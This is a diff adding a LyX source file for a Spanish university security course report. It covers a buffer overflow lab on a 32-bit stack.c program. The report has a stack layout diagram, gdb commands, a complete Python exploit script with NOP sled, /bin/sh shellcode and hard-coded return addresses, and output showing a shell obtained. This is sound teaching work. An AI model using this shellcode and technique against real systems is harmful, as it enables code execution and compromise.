@@ -1,0 +1,826 @@
+#LyX 2.3 created this file. For more info see http://www.lyx.org/
+\lyxformat 544
+\begin_document
+\begin_header
+\save_transient_properties true
+\origin unavailable
+\textclass book
+\begin_preamble
+
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage[graf, intHoriz, sinLU, hideDirectores]{caratula}
+
+
+% Haskell syntax highlighting
+\lstdefinestyle{haskell}{
+    language=Haskell,
+    basicstyle=\small\ttfamily,
+    keywordstyle=,
+    commentstyle=\color{green!50!black},
+    stringstyle=,
+    showstringspaces=false,
+    breaklines=true,
+    frame=single,
+    rulecolor=,
+    numbers=left,
+    numberstyle=\tiny,
+    stepnumber=1,
+    tabsize=4,
+    captionpos=b,
+    literate={->}{$\rightarrow$}{2}
+               {>=}{$\geq$}{2}
+               {<=}{$\leq$}{2}
+}
+
+
+\lstdefinestyle{cppstyle}{
+language=C++,
+basicstyle=\ttfamily\small,
+keywordstyle=\color{blue}\bfseries,
+commentstyle=\color{green!50!black}\itshape,
+stringstyle=\color{red},
+numbers=left,
+numberstyle=\tiny, % tamaño de los números de línea
+stepnumber=1,
+numbersep=8pt,
+frame=single,
+breaklines=true,
+showstringspaces=false,
+tabsize=2,
+captionpos=b
+}
+
+\lstdefinestyle{pythonstyle}{
+language=Python,
+basicstyle=\ttfamily\small,
+keywordstyle=\color{blue}\bfseries,
+commentstyle=\color{green!50!black}\itshape,
+stringstyle=\color{red},
+numbers=left,
+numberstyle=\tiny,
+stepnumber=1,
+numbersep=8pt,
+frame=single,
+breaklines=true,
+showstringspaces=false,
+tabsize=4,
+captionpos=b
+}
+\end_preamble
+\use_default_options false
+\maintain_unincluded_children false
+\language spanish
+\language_package default
+\inputencoding auto
+\fontencoding default
+\font_roman "default" "default"
+\font_sans "default" "default"
+\font_typewriter "default" "default"
+\font_math "auto" "auto"
+\font_default_family default
+\use_non_tex_fonts false
+\font_sc false
+\font_osf false
+\font_sf_scale 100 100
+\font_tt_scale 100 100
+\use_microtype false
+\use_dash_ligatures true
+\graphics default
+\default_output_format default
+\output_sync 0
+\bibtex_command default
+\index_command default
+\paperfontsize default
+\spacing single
+\use_hyperref false
+\papersize a4paper
+\use_geometry true
+\use_package amsmath 1
+\use_package amssymb 0
+\use_package cancel 0
+\use_package esint 1
+\use_package mathdots 0
+\use_package mathtools 0
+\use_package mhchem 0
+\use_package stackrel 0
+\use_package stmaryrd 0
+\use_package undertilde 0
+\cite_engine basic
+\cite_engine_type default
+\biblio_style plain
+\use_bibtopic false
+\use_indices false
+\paperorientation portrait
+\suppress_date false
+\justification true
+\use_refstyle 0
+\use_minted 0
+\fontcolor #808080
+\index Index
+\shortcut idx
+\color #008000
+\end_index
+\secnumdepth 3
+\tocdepth 3
+\paragraph_separation indent
+\paragraph_indentation default
+\is_math_indent 0
+\math_numbering_side default
+\quotes_style english
+\dynamic_quotes 0
+\papercolumns 1
+\papersides 1
+\paperpagestyle default
+\tracking_changes false
+\output_changes false
+\html_math_output 0
+\html_css_as_file 0
+\html_be_strict false
+\end_header
+
+\begin_body
+
+\begin_layout Standard
+\begin_inset ERT
+status open
+
+\begin_layout Plain Layout
+
+
+\backslash
+integrante{Pablo Alonso}{}{pabloalonsoxx@gmail.com}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+materia{Seguridad Informática}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+titulo{Segunda Entrega}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+director{}{}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+thispagestyle{empty}
+\end_layout
+
+\begin_layout Plain Layout
+
+
+\backslash
+maketitle
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+\begin_inset Newpage cleardoublepage
+\end_inset
+
+
+\end_layout
+
+\begin_layout Section*
+Primer modulo: Buffer Overflow
+\end_layout
+
+\begin_layout Subsection*
+Task 3: Launching Attack on 32-bit Program
+\end_layout
+
+\begin_layout Standard
+La tarea pide explotar una vulnerabilidad de tipo buffer-overflow sobre
+ un programa dado stack.c, el cual leed de un archivo badfile y utiliza el
+ método strcpy para copiar el contenido de este archivo a un buffer de tamaño
+ de 100 caracteres.
+ El objetivo es brindar el contenido de badfile para poder inyectar código
+ dentro del stack del programa y permitir al atacante ejecutar una shell.
+ Para lograr esto, el contenido del badfile debe incluir el código para
+ ejecutar la shell, y la 
+\begin_inset Formula $\textit{address}$
+\end_inset
+
+ del buffer de forma de sobreescribir la 
+\begin_inset Formula $\textit{return address}$
+\end_inset
+
+ del método llamante de strcpy 
+\begin_inset Formula $\textit{bof}$
+\end_inset
+
+ y que la ejecución salte al código de la shell luego de haber copiado el
+ contenido del archivo.
+\end_layout
+
+\begin_layout Subsection*
+Buffer Overflow Attack - Memory Layout
+\end_layout
+
+\begin_layout Enumerate
+Compilar el programa con gcc -o stack -ggdb -static -m32 -z execstack -fno-stack
+-protector stack.c.
+\end_layout
+
+\begin_layout Enumerate
+Correr gdb, ver ebp y buffer address:
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset listings
+lstparams "basicstyle={\ttfamily\small},frame=single"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+Higher Memory Addresses
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
++-------------------------------------------------------------+
+\end_layout
+
+\begin_layout Plain Layout
+
+|  Caller's (dummy_function) Stack Frame                    |
+\end_layout
+
+\begin_layout Plain Layout
+
++-------------------------------------------------------------+
+\end_layout
+
+\begin_layout Plain Layout
+
+|  Return Address to dummy_function  [EBP+4]  (4 bytes)     | <-- TARGET
+\end_layout
+
+\begin_layout Plain Layout
+
++-------------------------------------------------------------+
+\end_layout
+
+\begin_layout Plain Layout
+
+|  Saved EBP (Frame Pointer)         [EBP]    (4 bytes)     |
+\end_layout
+
+\begin_layout Plain Layout
+
++-------------------------------------------------------------+
+\end_layout
+
+\begin_layout Plain Layout
+
+|  Saved EBX Register                [EBP-4]  (4 bytes)     |
+\end_layout
+
+\begin_layout Plain Layout
+
++-------------------------------------------------------------+
+\end_layout
+
+\begin_layout Plain Layout
+
+|  Padding/Alignment                 [EBP-8]  (4 bytes)     |
+\end_layout
+
+\begin_layout Plain Layout
+
++-------------------------------------------------------------+
+\end_layout
+
+\begin_layout Plain Layout
+
+|  Buffer[99]                        [EBP-12]               |
+\end_layout
+
+\begin_layout Plain Layout
+
+|  Buffer[98]                                                |
+\end_layout
+
+\begin_layout Plain Layout
+
+|  ...
+                                                       |
+\end_layout
+
+\begin_layout Plain Layout
+
+|  Buffer[1]                                                 |
+\end_layout
+
+\begin_layout Plain Layout
+
+|  Buffer[0]                         [EBP-108] (100 bytes)  |
+\end_layout
+
+\begin_layout Plain Layout
+
++-------------------------------------------------------------+
+\end_layout
+
+\begin_layout Plain Layout
+
+|  Local variables / Stack space                            |
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+Lower Memory Addresses
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\begin_layout Standard
+Podemos chequear estas direcciones mediante gdb
+\end_layout
+
+\begin_layout Standard
+\begin_inset listings
+lstparams "style=cppstyle,caption={GDB Commands}"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+gdb ./stack
+\end_layout
+
+\begin_layout Plain Layout
+
+(gdb) break bof
+\end_layout
+
+\begin_layout Plain Layout
+
+(gdb) run < badfile
+\end_layout
+
+\begin_layout Plain Layout
+
+(gdb) print &buffer
+\end_layout
+
+\begin_layout Plain Layout
+
+(gdb) info registers ebp
+\end_layout
+
+\begin_layout Plain Layout
+
+(gdb) x/200bx $esp
+\end_layout
+
+\begin_layout Plain Layout
+
+(gdb) quit
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Enumerate
+\begin_inset Formula $\textit{return address}$
+\end_inset
+
+ se almacena en ebp+4, entonces hay que calcular la distancia entre 
+\begin_inset Formula $\textit{return address}$
+\end_inset
+
+ y el buffer.
+ Mediante un script podemos generar el payload necesario para sobreescribir
+ 
+\begin_inset Formula $\textit{return address}$
+\end_inset
+
+:
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset listings
+lstparams "style=pythonstyle,caption={exploit.py - Buffer Overflow Exploit Script}"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+#!/usr/bin/env python3
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+import sys
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+# Check if gdb mode is requested
+\end_layout
+
+\begin_layout Plain Layout
+
+gdb_mode = len(sys.argv) > 1 and sys.argv[1] == "--gdb"
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+# Exploit buffer construction
+\end_layout
+
+\begin_layout Plain Layout
+
+# Buffer layout:
+\end_layout
+
+\begin_layout Plain Layout
+
+# [NOP sled (32)] + [Shellcode (25)] + [Padding (53)] + [Return address
+ (4)]
+\end_layout
+
+\begin_layout Plain Layout
+
+# Total: 114 bytes (110 bytes payload + 4 bytes return address)
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+# 1.
+ NOP sled (32 bytes)
+\end_layout
+
+\begin_layout Plain Layout
+
+nop_sled = b"
+\backslash
+x90" * 32
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+# 2.
+ Shellcode to spawn /bin/sh (25 bytes)
+\end_layout
+
+\begin_layout Plain Layout
+
+shellcode = (
+\end_layout
+
+\begin_layout Plain Layout
+
+    b"
+\backslash
+x31
+\backslash
+xc0
+\backslash
+x50
+\backslash
+x68
+\backslash
+x2f
+\backslash
+x2f
+\backslash
+x73
+\backslash
+x68"
+\end_layout
+
+\begin_layout Plain Layout
+
+    b"
+\backslash
+x68
+\backslash
+x2f
+\backslash
+x62
+\backslash
+x69
+\backslash
+x6e
+\backslash
+x89
+\backslash
+xe3
+\backslash
+x50"
+\end_layout
+
+\begin_layout Plain Layout
+
+    b"
+\backslash
+x53
+\backslash
+x89
+\backslash
+xe1
+\backslash
+x31
+\backslash
+xd2
+\backslash
+x31
+\backslash
+xc0
+\backslash
+xb0"
+\end_layout
+
+\begin_layout Plain Layout
+
+    b"
+\backslash
+x0b
+\backslash
+xcd
+\backslash
+x80"
+\end_layout
+
+\begin_layout Plain Layout
+
+)
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+# 3.
+ Padding to reach the saved return address (53 bytes)
+\end_layout
+
+\begin_layout Plain Layout
+
+# Empirically: 110 bytes before return address works
+\end_layout
+
+\begin_layout Plain Layout
+
+# 110 - (32 + 25) = 53
+\end_layout
+
+\begin_layout Plain Layout
+
+padding = b"A" * 53
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+# 4.
+ Return address pointing into the NOP sled (little endian)
+\end_layout
+
+\begin_layout Plain Layout
+
+# With ASLR disabled and 112-byte offset:
+\end_layout
+
+\begin_layout Plain Layout
+
+# - Normal execution: buffer at 0xffffc8bc → target 0xffffc8b0 works
+\end_layout
+
+\begin_layout Plain Layout
+
+# - GDB execution: buffer at 0xffffc84c → target 0xffffc85c (middle of NOP
+ sled)
+\end_layout
+
+\begin_layout Plain Layout
+
+if gdb_mode:
+\end_layout
+
+\begin_layout Plain Layout
+
+    ret_addr = b"
+\backslash
+x5c
+\backslash
+xc8
+\backslash
+xff
+\backslash
+xff"  # For gdb: 0xffffc85c
+\end_layout
+
+\begin_layout Plain Layout
+
+    print("Mode: GDB", file=sys.stderr)
+\end_layout
+
+\begin_layout Plain Layout
+
+else:
+\end_layout
+
+\begin_layout Plain Layout
+
+    ret_addr = b"
+\backslash
+xb0
+\backslash
+xc8
+\backslash
+xff
+\backslash
+xff"  # For normal: 0xffffc8b0
+\end_layout
+
+\begin_layout Plain Layout
+
+    print("Mode: Normal execution", file=sys.stderr)
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+# Construct final exploit buffer
+\end_layout
+
+\begin_layout Plain Layout
+
+exploit = nop_sled + shellcode + padding + ret_addr
+\end_layout
+
+\begin_layout Plain Layout
+
+\end_layout
+
+\begin_layout Plain Layout
+
+# Output the exploit buffer as raw bytes
+\end_layout
+
+\begin_layout Plain Layout
+
+sys.stdout.buffer.write(exploit)
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Enumerate
+Hay que concatenar los 2 comandos para mantener el entorno y que se mantenga
+ la dirección del buffer.
+\end_layout
+
+\begin_deeper
+\begin_layout Standard
+\begin_inset listings
+lstparams "basicstyle={\ttfamily\small},frame=single"
+inline false
+status open
+
+\begin_layout Plain Layout
+
+seed@VM:~/.../code$ python3 create_shellcode.py > badfile &&
+\end_layout
+
+\begin_layout Plain Layout
+
+timeout 2 ./stack
+\end_layout
+
+\begin_layout Plain Layout
+
+Mode: Normal execution
+\end_layout
+
+\begin_layout Plain Layout
+
+Input size: 116
+\end_layout
+
+\begin_layout Plain Layout
+
+$ ls
+\end_layout
+
+\begin_layout Plain Layout
+
+Makefile                exploit_wrapper.sh
+\end_layout
+
+\begin_layout Plain Layout
+
+badfile                 peda-session-ls.txt
+\end_layout
+
+\begin_layout Plain Layout
+
+brute-force-exploit.sh  peda-session-stack.txt
+\end_layout
+
+\begin_layout Plain Layout
+
+brute-force.sh          shellcode
+\end_layout
+
+\begin_layout Plain Layout
+
+buffer_layout.md        stack
+\end_layout
+
+\begin_layout Plain Layout
+
+create_shellcode.py     stack.c
+\end_layout
+
+\begin_layout Plain Layout
+
+exploit.py              test_addr.sh
+\end_layout
+
+\begin_layout Plain Layout
+
+exploit_demo.sh
+\end_layout
+
+\end_inset
+
+
+\end_layout
+
+\end_deeper
+\begin_layout Standard
+
+\end_layout
+
+\end_body
+\end_document
